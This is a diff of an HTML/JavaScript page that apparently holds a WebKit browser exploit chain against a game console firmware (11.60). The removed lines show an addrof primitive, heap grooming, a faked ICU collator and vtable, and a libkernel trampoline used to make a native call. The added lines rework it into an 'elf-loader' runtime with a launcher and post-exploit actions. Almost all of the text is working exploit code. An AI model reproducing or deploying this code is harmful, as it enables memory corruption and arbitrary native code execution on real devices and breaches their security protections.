-    mark("WEBKIT-BASE", `${hex(webkitBase)}`
-        + `-parseInt-rva=${hex(PARSEINT_NATIVE_OFFSET)}`
-        + `-constructor-rva=${hex(HOST_CONSTRUCTOR_OFFSET)}`
-        + `-text-size=${hex(WEBKIT_TEXT_SIZE)}`);
-    mark("IMPORT-WINDOWS", `A=${hex(webkitBase + IMPORT_WINDOW_A_OFFSET)}`
-        + `+${hex(IMPORT_WINDOW_A_BYTES)}`
-        + `-B=${hex(webkitBase + IMPORT_WINDOW_B_OFFSET)}`
-        + `+${hex(IMPORT_WINDOW_B_BYTES)}`
-        + `-address-ok=${gotWindowAddressesOK}`
-        + `-read-twice=${gotWindowsRepeated}`
-        + `-canonical=${gotCanonicalOK}`);
-    mark("REQUIREMENTS-IMPORTS", `A=${hex(requirementsObjectA)}`
-        + `-B=${hex(requirementsObjectB)}`);
-    mark("REQUIREMENTS-BASE", `${hex(requirementsBase)}`
-        + `-paired=true-pass=${requirementsBaseOK}`);
-    mark("LIBC-IMPORTS-1", `cxa_finalize=${hex(cxaFinalizePointer)}`
-        + `:${importStatusName(cxaFinalizeStatus)}`
-        + `-strlen=${hex(strlenPointer)}:${importStatusName(strlenStatus)}`);
-    mark("LIBC-IMPORTS-2", `strerror=${hex(strerrorPointer)}`
-        + `:${importStatusName(strerrorStatus)}`
-        + `-memchr=${hex(memchrPointer)}:${importStatusName(memchrStatus)}`);
-    mark("LIBC-BASE", `${hex(libcBase)}-equations=${libcResolvedCount}`
-        + `-pass=${libcBaseOK}`);
-    mark("KERNEL-IMPORTS-1", `object=${hex(kernelObjectPointer)}`
-        + `-close=${hex(closePointer)}:${importStatusName(closeStatus)}`
-        + `-error=${hex(errorPointer)}:${importStatusName(errorStatus)}`);
-    mark("KERNEL-IMPORTS-2", `getpid=${hex(getpidPointer)}`
-        + `:${importStatusName(getpidStatus)}`
-        + `-pthread_getspecific=${hex(pthreadGetspecificPointer)}`
-        + `:${importStatusName(pthreadGetspecificStatus)}`);
-    mark("KERNEL-BASE", `${hex(kernelBase)}-equations=${kernelResolvedCount}`
-        + `-object-anchor=${kernelObjectBaseOK}-pass=${kernelBaseOK}`);
-    mark("ARENA-CELL", `view=${hex(arenaViewAddress)}`
-        + `-backing=${hex(arenaBacking)}`
-        + `-size=${hex(ARENA_BYTES)}`
-        + `-header-pass=${arenaViewHeaderOK}`
-        + `-sentinel-pass=${arenaBackingRepeated}`);
-    mark("COLLATOR", `cell=${hex(realCollatorAddress)}`
-        + `-m_collator=${hex(realCollatorAddress + 0x18)}`
-        + `-original=${hex(low48At(collatorHeader, 0x18))}`
-        + `-compare=${hex(compareFnAddress)}`
-        + `-search-prewarmed=${collatorHeaderOK}`);
-    mark("NOTIFY-ARENA", `B=${hex(fakeUCollatorAddress)}`
-        + `-V=${hex(fakeVtableAddress)}`
-        + `-virtual-slot=${hex(fakeVtableAddress + 0x128)}`);
-    mark("NOTIFY-TRAMPOLINE", `${hex(naturalTrampolineAddress)}`
-        + `-libkernel-rva=${hex(NATURAL_TRAMPOLINE_OFFSET)}`
-        + "-natural-rsp=true-bytes=488b8fe000000051488b4f60488b7f48c3");
-    mark("NOTIFY-TARGET", `${hex(notifyEntryAddress)}`
-        + `-libkernel-rva=${hex(NOTIFY_OFFSET)}`
-        + `-address-ok=${notifyAddressOK}`
-        + "-offline-verified-fw=11.60-xotext-not-read=true");
-    mark("NOTIFY-CONTEXT", "B+48-rdi=0-device"
-        + "-B+60-rcx=0-nonblocking-B+e0=notification-export"
-        + `-rsi=request-rdx=${hex(NOTIFICATION_REQUEST_SIZE)}`);
-    mark("NOTIFY-REQUEST", `size=${hex(NOTIFICATION_REQUEST_SIZE)}`
-        + `-message-offset=${hex(NOTIFICATION_MESSAGE_OFFSET)}`
-        + `-ascii=true-layout-pass=${notificationRequestOK}`
-        + `-prewarm-result=${notificationPrewarmResult}`);
-    mark("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
-    mark("NATIVE-EXECUTABLE-HEX",
-        dumpHex(targetHeader, NATIVE_EXECUTABLE_BYTES));
-    mark("IMPORT-WINDOW-A-HEX", dumpHex(importWindowA1, IMPORT_WINDOW_A_BYTES));
-    mark("IMPORT-WINDOW-B-HEX", dumpHex(importWindowB1, IMPORT_WINDOW_B_BYTES));
 
     const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK
         && nativeExecutableHeaderOK && webkitBaseOK
         && pointersRepeated && restoreObserved
-        && gotReadOK && requirementsBaseOK && libcBaseOK && kernelBaseOK
+        && gotReadOK && kernelBaseOK
+        && (!REFERENCE_ATTESTATION || libcBaseOK)
         && arenaViewHeaderOK && arenaBackingRepeated
         && collatorHeaderOK && compareFnHeaderOK
-        && getpidStatus === 1
         && notifyAddressOK
-        && notificationRequestOK
         && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
         && compositionLength === EXPECTED_LENGTH;
     try {
         sessionStorage.setItem(blockKey, "1");
-        sessionStorage.setItem(passKey, "pending");
-        commitBlockConfirmed = sessionStorage.getItem(blockKey) === "1"
-            && sessionStorage.getItem(passKey) === "pending";
+        attemptBlocked = sessionStorage.getItem(blockKey) === "1";
     } catch {
-        commitBlockConfirmed = false;
+        attemptBlocked = false;
     }
 
-    if (leakPass) {
-        mark("MODULE-IMPORT-LEAK-PASS",
-            "windows-read-twice=true-provider-crosschecks=true"
-            + "-holder-targets-validated=true-notification-target-verified=true");
-    } else {
-        mark("MODULE-IMPORT-LEAK-MISMATCH", `rw=${rwHeaderOK}`
-            + `-function=${functionHeaderOK}`
-            + `-native=${nativeExecutableHeaderOK}`
-            + `-base=${webkitBaseOK}`
-            + `-repeat=${pointersRepeated}-got=${gotReadOK}`
-            + `-requirements=${requirementsBaseOK}`
-            + `-libc=${libcBaseOK}-kernel=${kernelBaseOK}`
-            + `-restore=${restoreObserved}`);
-    }
-
-    mark("ROOTS-LIVE", `rw-mirror=${rwMirror[0].toString(16)}`
-        + `-guard-byte=${targetView[0].toString(16)}`
-        + `-parseInt-type=${typeof nativeTarget}`
-        + `-length-word=${lengthWord.keep.toString(16)}`);
-    if (leakPass && notifyReady && carrierArmedForCommit
-        && commitBlockConfirmed) {
-        mark("NOTIFY-PLAN-PASS", `arena-filled=${arenaFilledOK}`
-            + "-carrier-parked-at-collator-field=true");
-        mark("NONFATAL-NATIVE-CALL-NEXT",
-            "system-notification-via-natural-stack-no-kernel-exploit");
-        setTimeout(commitNotificationProof, 250);
-        return;
-    }
-
-    mark("NOTIFY-PLAN-MISMATCH", `ready=${notifyReady}`
-        + `-arena=${arenaLayoutOK}-filled=${arenaFilledOK}`
-        + `-collator=${collatorHeaderOK}`
-        + `-compare=${compareFnHeaderOK}`
-        + `-request=${notificationRequestOK}`
-        + `-target=${notifyAddressOK}`
-        + `-carrier-armed=${carrierArmedForCommit}`
-        + `-repeat-block=${commitBlockConfirmed}`);
-    failed();
-    setTimeout(() => { mark("SURVIVED-NO-COMMIT-T1000"); }, 1000);
-}
-
-function commitNotificationProof() {
-    if (!notifyReady || !carrierArmedForCommit || !commitBlockConfirmed
-        || commitStarted) {
-        mark("COMMIT-ABORT", "state-changed-before-commit");
-        failed();
-        return;
-    }
-
-    for (let before = 0; before < collatorOriginal.length; ++before) {
-        if (rwView[before] !== collatorOriginal[before]) {
-            mark("COMMIT-ABORT", "collator-bytes-changed-before-commit");
-            failed();
+    if (leakPass && handoffReady && carrierReady && attemptBlocked) {
+        if (!probeRuntimeCarrier()) {
+            hardStop("runtime carrier probe failed");
             return;
         }
-    }
-    if (rwView[0x1b] !== 0) {
-        mark("COMMIT-ABORT", "ascii-tristate-no-longer-false");
-        failed();
-        return;
-    }
-    if (!notificationRequestOK
-        || notificationRequest.length !== NOTIFICATION_REQUEST_SIZE) {
-        mark("COMMIT-ABORT", "notification-request-changed-before-commit");
-        failed();
+        releaseGroomingMemoryForRuntime();
+        setTimeout(launchRuntime, 250);
         return;
     }
 
-    commitStarted = true;
-    const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
-    scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
-    scratchWords[1] = fakeHigh;
-    let notifyResult = 0;
-    let callError = null;
-    for (let commitByte = 0; commitByte < 8; ++commitByte)
-        rwView[commitByte] = scratchBytes[commitByte];
-
-    try {
-        notifyResult = compareFn(notificationRequest, "b");
-    } catch (error) {
-        callError = error;
-    }
-
-    for (let restoreByte = 0; restoreByte < collatorOriginal.length;
-        ++restoreByte)
-        rwView[restoreByte] = collatorOriginal[restoreByte];
-    let collatorRestored = true;
-    for (let verifyRestore = 0; verifyRestore < collatorOriginal.length;
-        ++verifyRestore) {
-        if (rwView[verifyRestore] !== collatorOriginal[verifyRestore])
-            collatorRestored = false;
-    }
-
-    fakeHost.q2 = null;
-    rwView = null;
-    rwMirror = null;
-    rwBuffer = null;
-
-    const notifyReturned = !callError && collatorRestored
-        && Number.isFinite(notifyResult)
-        && Math.floor(notifyResult) === notifyResult;
-    const notificationSent = notifyReturned && notifyResult === 0;
-    let passPersisted = false;
-    if (notificationSent) {
-        try {
-            sessionStorage.setItem(passKey, "1");
-            passPersisted = sessionStorage.getItem(passKey) === "1";
-        } catch {}
-    }
-
-    if (notificationSent && passPersisted) {
-        mark("NOTIFY-NATIVE-CALL-PASS", "result=0"
-            + "-collator-restored=true-permanent-block=true");
-        succeeded(`result=0 attempt=${attemptNumber}`);
-    } else if (callError) {
-        mark("NOTIFY-CALL-THREW", `${callError?.name}`
-            + `:${String(callError?.message).slice(0, 80)}`
-            + `-collator-restored=${collatorRestored}`);
-        failed();
-    } else if (notificationSent) {
-        mark("NOTIFY-PASS-STORAGE-FAIL", "result=0"
-            + "-collator-restored=true");
-        succeeded(`result=0 attempt=${attemptNumber}`);
-    } else if (notifyReturned) {
-        const notifyResultU32 = notifyResult < 0
-            ? notifyResult + 0x100000000 : notifyResult;
-        mark("NOTIFY-NATIVE-CALL-RETURN", `error=${hex(notifyResultU32)}`
-            + `-signed=${notifyResult}`
-            + "-collator-restored=true");
-        failed();
-    } else {
-        mark("NOTIFY-RETURN-MISMATCH", `result=${notifyResult}`
-            + `-collator-restored=${collatorRestored}`);
-        failed();
-    }
-    setTimeout(() => { mark("SURVIVED-NOTIFY-T1000"); }, 1000);
+    failed(!collatorHeaderOK
+        ? "collator layout validation failed"
+        : "native handoff validation failed");
 }
 
 function runGroomAndLoad() {
     try {
-        mark("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
         const channel = new MessageChannel();
         channel.port1.close();
         channel.port2.close();
@@ -1750,39 +2128,35 @@ function runGroomAndLoad() {
         const separator = buffer(SEPARATOR_SIZE);
         const earlyHole = buffer(EARLY_HOLE_SIZE);
         const guard = buffer(GUARD_SIZE);
-        const predecessor = buffer(PREDECESSOR_SIZE);
-        const finalHole = buffer(FINAL_HOLE_SIZE);
-
-        fillRawCellPointers(predecessor, fakeAddress);
         keepAlive[keepIndex++] = separator;
         keepAlive[keepIndex++] = guard;
-        keepAlive[keepIndex++] = predecessor;
-        mark("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
-            + `-fake=${hex(fakeAddress)}`);
+        const finalHoles = [];
+        for (let i = 0; i < PLACEMENT_PAIRS; ++i) {
+            const predecessor = buffer(PREDECESSOR_SIZE);
+            fillRawCellPointers(predecessor, fakeAddress);
+            keepAlive[keepIndex++] = predecessor;
+            finalHoles.push(buffer(FINAL_HOLE_SIZE));
+        }
 
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
-            earlyHole, finalHole]);
+            earlyHole].concat(finalHoles));
         loadHistoryCritical();
-    } catch (error) {
+    } catch {
         try { clearPredecessor(); } catch {}
         retrySafe = true;
-        compositionError = error;
         compositionState = -1;
     }
     reportComposition();
 }
 
 function beginComposition() {
+    mark("COMPOSITION-BEGIN", `captureState=${captureState}`);
     if (captureState === 0) {
-        finishEarlySafeAttempt("ADDROF-NO-RESULT",
-            "capture-task-did-not-finish", "addrof-no-result");
+        finishEarlySafeAttempt("addrof-no-result");
         return;
     }
     if (captureState < 0) {
-        finishEarlySafeAttempt("ADDROF-THREW",
-            `${captureError?.name}:`
-            + String(captureError?.message).slice(0, 80),
-            "addrof-threw");
+        finishEarlySafeAttempt("addrof-threw");
         return;
     }
 
@@ -1797,16 +2171,9 @@ function beginComposition() {
     const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
     const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
 
-    mark("ADDROF-RETURNED", REVISION);
-    mark("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
-    mark("ADDROF-POINTERS", `HOST=${hex(a0)}-TARGET=${hex(b0)}`
-        + `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`);
 
     if (!(repeated && distinct && plausible && sourceCovered)) {
-        finishEarlySafeAttempt("ADDROF-FAIL",
-            `repeat=${repeated}-distinct=${distinct}`
-            + `-plausible=${plausible}-covered=${sourceCovered}`,
-            "addrof-validation");
+        finishEarlySafeAttempt("addrof-validation");
         return;
     }
 
@@ -1818,45 +2185,111 @@ function beginComposition() {
         || targetAddressLow < 0 || targetAddressLow > 0xffffffff
         || Math.floor(targetAddressLow) !== targetAddressLow
         || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
-        finishEarlySafeAttempt("TARGET-ADDRESS-FAIL",
-            `target=${hex(targetAddress)}`, "target-address");
+        finishEarlySafeAttempt("target-address");
         return;
     }
-    fakeAddress = hostAddress + 0x10;
-    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
-        finishEarlySafeAttempt("FAKE-ADDRESS-FAIL",
-            `host=${hex(hostAddress)}`, "fake-address");
+    const fakeOffset = RENDERER_OBJECTS.plainObject.inlineStorageOffset;
+    fakeAddress = hostAddress + fakeOffset;
+    if (!plausibleCell(fakeAddress)
+        || fakeAddress - hostAddress !== fakeOffset) {
+        finishEarlySafeAttempt("fake-address");
         return;
     }
-    mark("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}`
-        + "-delta=0x10");
     runGroomAndLoad();
 }
 
-catState("run");
+function initializeRuntimePage() {
+    I18n.apply(document);
+    primePostExploitActions();
+    setCaption(t("runtime.caption", { firmware: FW_LABEL }));
+    if (I18n.lastLoadError)
+        mark("LOCALE-LOAD-FAILED", String(I18n.lastLoadError.message)
+            .slice(0, 256));
 
-mark("BOOT", `rev=${REVISION}-k=${K}-n=${DRAIN_COUNT}`
-    + `-attempt=${attemptNumber}-armed=${armed}-loop=relentless`);
+    if (armed) {
+        catState("run");
+        document.documentElement.dataset.rendererState = "armed";
+    } else {
+        try { document.getElementById("cat").className = "run"; } catch {}
+    }
 
-if (!armed) {
-    stopped = true;
-    catState("run");
-    showStatus("open with ?go=1", "run");
-} else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
-    || typeof Symbol !== "function" || typeof history === "undefined"
-    || typeof history.replaceState !== "function") {
-    mark("UNSUPPORTED");
-    showStatus("unsupported browser", "bad");
-} else {
-    // No pass/block latch: every armed load runs fresh so it can be re-run.
-    alreadyPassed = false;
-    alreadyBlocked = false;
-    try {
-        sessionStorage.removeItem(passKey);
-        sessionStorage.removeItem(blockKey);
-    } catch {}
-    startAttempt();
+    if (COMPLETE_PREVIEW) {
+        stopped = true;
+        try {
+            var completePreviewCat = document.getElementById("cat");
+            completePreviewCat.src = IMG_IDLE;
+            completePreviewCat.className = "run";
+        } catch {}
+        setStageBanner(t("runtime.stage.complete"), "ok complete");
+        showStatus("", "ok");
+        document.documentElement.dataset.rendererState =
+            "preview-complete-ready";
+    } else if (POST_ACTION_PREVIEW) {
+        stopped = true;
+        try {
+            var previewCat = document.getElementById("cat");
+            previewCat.src = IMG_IDLE;
+            previewCat.className = "run";
+        } catch {}
+        setStageBanner(t("runtime.stage.preview"), "");
+        showStatus(t("runtime.status.preview"), "run");
+        document.documentElement.dataset.rendererState = "preview-ready";
+    } else if (!armed) {
+        stopped = true;
+        try {
+            var idleCat = document.getElementById("cat");
+            idleCat.src = IMG_IDLE;
+            idleCat.className = "run";
+        } catch {}
+        setStageBanner("", "");
+        showStatus(t("runtime.status.openLauncher"), "run");
+        document.documentElement.dataset.rendererState = "unarmed-ready";
+    } else if (RENDERER_CONTRACT_ERROR) {
+        hardStop("renderer contract query rejected; return to the launcher");
+    } else if (RUN_MODE !== "elf-loader") {
+        hardStop("renderer mode rejected; return to the launcher");
+    } else if (!singleAttemptPolicy) {
+        hardStop("single-attempt renderer policy mismatch; return to the launcher");
+    } else if (!NATIVE_TEXT_SIZE_QUERY_VALID) {
+        hardStop("native text size query rejected; return to the launcher");
+    } else if (typeof BigInt !== "function"
+        || typeof MessageChannel !== "function"
+        || typeof Symbol !== "function" || typeof history === "undefined"
+        || typeof history.replaceState !== "function") {
+        stopped = true;
+        catState("bad");
+        setStageBanner(t("runtime.stage.stopped"), "bad");
+        showStatus(t("runtime.status.browserUnsupported"), "bad");
+    } else {
+        let runClaimed = false;
+        let reentry = false;
+        if (!validRunToken) {
+            hardStop("missing or invalid run token; reopen the launcher");
+        } else {
+            try {
+                reentry = sessionStorage.getItem(runKey) !== null;
+                if (!reentry) {
+                    sessionStorage.setItem(runKey, navigationID);
+                    runClaimed = sessionStorage.getItem(runKey) === navigationID;
+                }
+            } catch { runClaimed = false; }
+            if (reentry) {
+                hardStop("renderer reload blocked; return to the launcher");
+            } else if (!runClaimed) {
+                hardStop("run-token persistence unavailable");
+            }
+        }
+        if (!stopped && alreadyBlocked) {
+            hardStop("renderer attempt already recorded; reboot and return to the launcher");
+        }
+        if (!stopped) {
+            mark("ARMED-INIT", `fw=${FW_LABEL} mode=${RUN_MODE}`);
+            preloadRuntimeProfile();
+        }
+    }
 }
+
+localeReady.then(initializeRuntimePage);
 </script>
 </body>
 </html>
